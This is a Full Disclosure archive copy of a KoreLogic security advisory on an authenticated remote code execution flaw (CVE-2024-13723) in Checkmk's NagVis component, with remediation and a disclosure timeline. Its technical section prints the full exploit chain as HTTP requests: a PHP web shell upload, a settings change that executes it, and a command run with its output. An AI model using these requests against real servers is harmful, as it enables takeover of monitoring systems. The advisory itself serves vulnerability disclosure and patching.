---
title: KL-001-2025-002: Checkmk NagVis Remote Code Execution
url: https://seclists.org/fulldisclosure/2025/Feb/4
source: Full Disclosure
date: 2025-02-05
fetch_date: 2025-10-06T20:37:59.950573
---

# KL-001-2025-002: Checkmk NagVis Remote Code Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-002: Checkmk NagVis Remote Code Execution

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 4 Feb 2025 16:11:00 -0600

---

```
KL-001-2025-002: Checkmk NagVis Remote Code Execution

Title: Checkmk NagVis Remote Code Execution
Advisory ID: KL-001-2025-002
Publication Date: 2025-02-04
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-002.txt

1. Vulnerability Details

     Affected Vendor: Checkmk
     Affected Product: Checkmk/NagVis
     Affected Version: Checkmk 2.3.0p2, NagVis 1.9.40
     Platform: GNU/Linux
     CWE Classification: CWE-434: Unrestricted Upload of File with
                         Dangerous Type
     CVE ID: CVE-2024-13723

2. Vulnerability Description

     The "NagVis" component within Checkmk is vulnerable to remote
     code execution. An authenticated attacker with administrative
     level privileges is able to upload a malicious PHP file and
     modify specific settings to execute the contents of the file
     as PHP.

3. Technical Description

     Checkmk version 2.3.0.p2 ships with a component named
     "NagVis", which is an addon for the network management
     system "Nagios". When receiving an HTTP POST request for
     the "server/core/ajax_handler.php" file, the query and body
     parameters contained within the request are processed by the
     script. Specifically, the script accepts the "mod" and "act"
     query parameters, which specified which "module" and "action"
     the AJAX handler should invoke.

     The "Map" module in conjunction with the "manage" action enable
     a user to upload a configuration file that will be used to
     generate a visual map of data points. The name and extension
     of the uploaded file are validated, limiting file names to the
     ".cfg" extension. The contents of the file are not validated. In
     fact, a developer comment located within the code for the
     "ViewManageMaps" PHP class calls out this lack of validation:

          // FIXME: We really should validate the contents of the file

          move_uploaded_file($file['tmp_name'], $file_path);
          $CORE->setPerms($file_path);

     This lack of validation allows an authenticated attacker
     to upload ".cfg" files with arbitrary contents, effectively
     planting the payload for the second stage of this exploit. The
     following is an example HTTP request that uploads a malicious
     map config file containing PHP code:

          POST /cmk/nagvis/server/core/ajax_handler.php?mod=Map&act=manage HTTP/1.1
          Host: REDACTED
          User-Agent: KoreLogic
          Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywVfDQNT6TUqAmrdm
          Content-Length: 829
          Connection: keep-alive

          ------WebKitFormBoundarywVfDQNT6TUqAmrdm
          Content-Disposition: form-data; name="_form_name"

          import_map
          ------WebKitFormBoundarywVfDQNT6TUqAmrdm
          Content-Disposition: form-data; name="_update"

          0
          ------WebKitFormBoundarywVfDQNT6TUqAmrdm
          Content-Disposition: form-data; name="mode"

          import
          ------WebKitFormBoundarywVfDQNT6TUqAmrdm
          Content-Disposition: form-data; name="MAX_FILE_SIZE"

          1000000
          ------WebKitFormBoundarywVfDQNT6TUqAmrdm
          Content-Disposition: form-data; name="_submit"

          Import
          ------WebKitFormBoundarywVfDQNT6TUqAmrdm
          Content-Disposition: form-data; name="_ajaxid"

          1716303027
          ------WebKitFormBoundarywVfDQNT6TUqAmrdm
          Content-Disposition: form-data; name="map_file"; filename="exploit.cfg"
          Content-Type: text/plain

          <?php system($_GET["cmd"]); ?>
          ------WebKitFormBoundarywVfDQNT6TUqAmrdm--

     The uploaded file is located at
     "/opt/omd/sites/cmk/etc/nagvis/maps/exploit.cfg".

     When sending a POST request to the AJAX handler with the
     "MainCfg" module and the "edit" action, an authenticated
     user with administrative privileges can modify system
     settings for NagVis. The body parameters of the POST request
     contains the various settings associated with NagVis. The
     "global_authorisation_multisite_file" parameter accepts an
     absolute file path to the PHP file containing authorization
     logic for NagVis. By modifying this value to instead point to
     the malicious map config file uploaded earlier, the attacker
     controlled contents of the file are executed as PHP when the
     authorization handler is invoked (such as when attempting to
     view a page in NagVis). The following is an truncated HTTP
     request that will perform this settings change:

          POST /cmk/nagvis/server/core/ajax_handler.php?mod=MainCfg&act=edit HTTP/1.1
          Host: REDACTED
          User-Agent: KoreLogic
          Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9YYnBsaDteptwiuR
          Content-Length: 44877
          Connection: keep-alive

          ...
          [TRUNCATED]
          ...
          ------WebKitFormBoundary9YYnBsaDteptwiuR
          Content-Disposition: form-data; name="global_authorisation_multisite_file"

          /opt/omd/sites/cmk/etc/nagvis/maps/exploit.cfg
          ...
          [TRUNCATED]
          ...

     Now that the exploit file is in place and the proper setting has
     been updated, an HTTP request can be sent containing the "CMD"
     query parameter. The value of the the parameter will be executed
     as a shell command and the response will be included in the
     HTTP response. The following is an HTTP request demonstrating
     that ability:

          GET /cmk/nagvis/frontend/nagvis-js/?cmd=id HTTP/1.1
          Host: REDACTED
          User-Agent: KoreLogic
          Cookie: auth_cmk=REDACTED;
          Connection: close

     HTTP response containing output of "id" command:

          HTTP/1.1 200 OK
          Date: Wed, 22 May 2024 19:52:45 GMT
          Server: Apache
          ...
          [TRUNCATED]
          ...
          Content-Type: text/html; charset=UTF-8
          Content-Length: 2543

          uid=1000(cmk) gid=1000(cmk) groups=1000(cmk),107(omd)
          Error (Error): Call to undefined function all_users()array(1) {
            [0]=>
            array(2) {
              ["function"]=>
          ...
          [TRUNCATED]
          ...

4. Mitigation and Remediation Recommendation

     This issue has been remediated in Nagvis 1.9.42 and Checkmk
     2.3.0p10, both released 2024-07-15.

5. Credit

     This vulnerability was discovered by Jaggar Henry and Jim
     Becher of KoreLogic, Inc.

6. Disclosure Timeline

     2024-06-11 : KoreLogic reports vulnerability details to Checkmk
                  Security Team.
     2024-06-12 : Checkmk acknowledges receipt.
     2024-06-21 : Checkmk requests an extension of embargo to
                  90 business days.
     2024-07-15 : Checkmk/NagVis release versions featuring
                  remediation for the reported vulnerability.
                  Checkmk neglects to inform KoreLogic of this event.
     2024-11-22 : KoreLogic requests an update from Checkmk but
                  ...